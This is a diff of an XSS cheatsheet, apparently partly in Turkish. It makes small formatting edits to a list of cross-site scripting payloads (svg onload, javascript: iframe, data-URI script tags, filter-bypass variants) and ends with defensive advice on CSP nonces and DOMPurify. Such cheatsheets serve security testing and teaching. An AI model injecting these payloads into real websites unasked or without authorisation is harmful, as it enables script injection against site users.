@@ -3,13 +3,13 @@
 Cross-Site Scripting (XSS) Cheatsheet  
 --------------------------------------------------------------------  
 **XSS Locators:**  
-`'';!--"<XSS>=&{()}`  
+'';!--"<XSS>=&{()}  
 --------------------------------------------------------------------  
 **Classic Payloads:**  
 <svg onload=alert(1)>
 "><svg onload=alert(1)>
 <iframe src="javascript:alert(1)">
-"><script src=data:&comma;alert(1)//
+"><script src=data:,alert(1)//
 --------------------------------------------------------------------  
 **script tag filter bypass:**  
 <svg/onload=alert(1)>
@@ -200,5 +200,3 @@ alert`xss`; Here we can execute our code
 <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-abc123'">  
 <script nonce="abc123">alert('Güvenli script')</script>  
 5. DOMPurify gibi kütüphaneler ile HTML temizleme.
-
----
